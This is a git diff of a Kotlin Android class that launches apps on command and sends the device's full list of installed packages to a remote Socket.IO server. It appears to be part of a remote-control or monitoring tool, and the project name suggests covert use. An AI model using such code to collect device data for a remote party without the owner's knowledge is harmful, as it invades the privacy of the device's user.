@@ -1,21 +1,13 @@
 package com.example.betryalcommit
 
-import android.app.ActivityManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
-import android.content.pm.ResolveInfo
-import android.net.Uri
-import android.os.Build
-import android.os.Process
-import android.system.Os
-import androidx.annotation.RequiresApi
-import androidx.appcompat.app.AppCompatActivity
-import okhttp3.WebSocket
+import io.socket.client.Socket
 import org.json.JSONObject
 
-class packagefun(private val context: Context ,private val webSocket: WebSocket ) {
+class packagefun(private val context: Context, private val webSocket: Socket) {
      fun launchApp(packageName: String ) {
         val targetPackageName = packageName
         val packageManager = context.getPackageManager()
@@ -25,10 +17,7 @@ class packagefun(private val context: Context ,private val webSocket: WebSocket 
              context.startActivity(intent)
          }else
             {
-                val json = JSONObject()
-                json.put("type", "error")
-                json.put("data", "App not found")
-                webSocket.send(json.toString())
+             null
             }
 
     }
@@ -39,7 +28,9 @@ class packagefun(private val context: Context ,private val webSocket: WebSocket 
         settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         context.startActivity(settingsIntent)
     }
-    fun applog(webSocket: WebSocket): List<String> {
+
+
+    fun applog(): List<String> {
         val packages = mutableListOf<String>("all apps: \n\n");
         val pm = context.packageManager
         val installedApps = pm.getInstalledPackages(PackageManager.GET_META_DATA)
@@ -50,10 +41,10 @@ class packagefun(private val context: Context ,private val webSocket: WebSocket 
             }
         }
 
-        val json = JSONObject()
-        json.put("type", "error")
-        json.put("data", packages)
-        webSocket.send(json.toString())
+        val jsontext = JSONObject()
+        jsontext.put("type","app_logs")
+        jsontext.put("data",packages.toString());
+        webSocket.emit("response",jsontext.toString())
         return packages
     }
 
